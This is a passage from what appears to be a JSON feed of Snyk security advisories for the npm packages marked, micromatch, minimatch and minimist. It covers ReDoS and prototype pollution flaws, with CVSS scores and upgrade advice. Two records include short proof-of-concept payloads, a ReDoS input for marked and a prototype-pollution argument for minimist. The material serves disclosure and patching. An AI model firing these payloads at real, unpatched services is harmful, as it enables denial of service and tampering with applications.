            "id": "CVE-2022-21681",
            "source": "CVE"
          },
          {
            "id": "CWE-1333",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.0.10 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.0.10"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.0.10"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-01-16T08:58:04Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-01-16T14:42:47Z",
            "references": [
              {
                "url": "https://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MARKED-2342082",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when unsanitized user input is passed to `block.def`.\r\n\r\n## PoC\r\n```js\r\nimport * as marked from \"marked\";\r\nmarked.parse(`[x]:${' '.repeat(1500)}x ${' '.repeat(1500)} x`);\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 4.0.10 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0)\n- [GitHub Release](https://github.com/markedjs/marked/releases/tag/v4.0.10)\n",
        "created_at": "2022-01-16T12:11:35Z",
        "updated_at": "2024-03-11T09:53:51Z",
        "problems": [
          {
            "id": "CVE-2022-21680",
            "source": "CVE"
          },
          {
            "id": "CWE-1333",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.0.10 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.0.10"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.0.10"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-01-14T21:04:41Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-01-16T15:23:59Z",
            "references": [
              {
                "url": "https://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/markedjs/marked/releases/tag/v4.0.10",
                "title": "GitHub Release"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MARKED-451540",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). A  Denial of Service condition could be triggered through exploitation of the `heading` regex.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 0.4.0 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/commit/09afabf69c6d0c919c03443f47bdfe476566105d)\n- [GitHub PR](https://github.com/markedjs/marked/pull/1224)\n",
        "created_at": "2019-07-04T15:39:07Z",
        "updated_at": "2024-03-06T13:55:20Z",
        "problems": [
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.4.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.4.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.4.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2018-04-16T15:34:35Z",
            "exploit": "Not Defined",
            "publication_time": "2019-07-04T15:34:22Z",
            "references": [
              {
                "url": "https://github.com/markedjs/marked/commit/09afabf69c6d0c919c03443f47bdfe476566105d",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/markedjs/marked/pull/1224",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MARKED-584281",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The `em` regex within `src/rules.js` file have multiple unused capture groups which could lead to a denial of service attack if user input is reachable.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 1.1.1 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/commit/bd4f8c464befad2b304d51e33e89e567326e62e0)\n",
        "created_at": "2020-07-13T15:50:25Z",
        "updated_at": "2024-03-06T14:00:32Z",
        "problems": [
          {
            "id": "CWE-1333",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.1.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.1.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.1.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.9,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/E:U/RL:O/RC:R"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2020-07-13T15:47:58Z",
            "exploit": "Unproven",
            "publication_time": "2020-07-27T15:44:09Z",
            "references": [
              {
                "url": "https://github.com/markedjs/marked/commit/bd4f8c464befad2b304d51e33e89e567326e62e0",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MICROMATCH-6838728",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Inefficient Regular Expression Complexity",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Inefficient Regular Expression Complexity due to the use of unsafe pattern configurations that allow greedy matching through the `micromatch.braces()` function. An attacker can cause the application to hang or slow down by passing a malicious payload that triggers extensive backtracking in regular expression processing.\n## Remediation\nUpgrade `micromatch` to version 4.0.6 or higher.\n## References\n- [GitHub Issue](https://github.com/micromatch/micromatch/issues/243)\n- [GitHub PR](https://github.com/micromatch/micromatch/pull/247)\n- [Vulnerable Code](https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448)\n",
        "created_at": "2024-05-13T14:42:04Z",
        "updated_at": "2024-06-06T12:41:40Z",
        "problems": [
          {
            "id": "CVE-2024-4067",
            "source": "CVE"
          },
          {
            "id": "CWE-1333",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.0.6 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.0.6"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.0.6"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2024-05-13T10:40:15Z",
            "exploit": "Not Defined",
            "publication_time": "2024-05-13T14:42:05Z",
            "references": [
              {
                "url": "https://github.com/micromatch/micromatch/issues/243",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/micromatch/micromatch/pull/247",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js%23L448",
                "title": "Vulnerable Code"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MINIMATCH-1019388",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[minimatch](https://www.npmjs.com/package/minimatch) is a minimal matching utility.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via complicated and illegal regexes.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `minimatch` to version 3.0.2 or higher.\n## References\n- [GitHub Commit](https://github.com/isaacs/minimatch/commit/6944abf9e0694bd22fd9dad293faa40c2bc8a955)\n",
        "created_at": "2020-10-19T15:28:02Z",
        "updated_at": "2024-03-06T13:59:33Z",
        "problems": [
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.0.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2016-06-20T16:00:06Z",
            "exploit": "Not Defined",
            "publication_time": "2016-06-20T16:00:06Z",
            "references": [
              {
                "url": "https://github.com/isaacs/minimatch/commit/6944abf9e0694bd22fd9dad293faa40c2bc8a955",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MINIMATCH-3050818",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[minimatch](https://www.npmjs.com/package/minimatch) is a minimal matching utility.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `braceExpand` function in `minimatch.js`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `minimatch` to version 3.0.5 or higher.\n## References\n- [GitHub Commit](https://github.com/isaacs/minimatch/commit/a8763f4388e51956be62dc6025cec1126beeb5e6)\n",
        "created_at": "2022-10-18T06:10:47Z",
        "updated_at": "2024-03-11T09:53:57Z",
        "problems": [
          {
            "id": "CVE-2022-3517",
            "source": "CVE"
          },
          {
            "id": "CWE-1333",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.5 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.5"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.0.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-10-18T06:00:25Z",
            "exploit": "Not Defined",
            "publication_time": "2022-10-18T06:29:18Z",
            "references": [
              {
                "url": "https://github.com/isaacs/minimatch/commit/a8763f4388e51956be62dc6025cec1126beeb5e6",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MINIMIST-2429795",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\n\nAffected versions of this package are vulnerable to Prototype Pollution due to a missing handler to `Function.prototype`.\r\n\r\n**Notes:** \r\n\r\n- This vulnerability is a bypass to [CVE-2020-7598](https://security.snyk.io/vuln/SNYK-JS-MINIMIST-559764)\r\n\r\n- The reason for the different CVSS between CVE-2021-44906 to CVE-2020-7598, is that CVE-2020-7598 can pollute objects, while CVE-2021-44906 can pollute only function.\r\n\r\n\r\n## PoC by Snyk\r\n```js\r\nrequire('minimist')('--_.constructor.constructor.prototype.foo bar'.split(' '));\r\nconsole.log((function(){}).foo); // bar\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `minimist` to version 0.2.4, 1.2.6 or higher.\n## References\n- [Fix Commit](https://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703)\n- [Fix 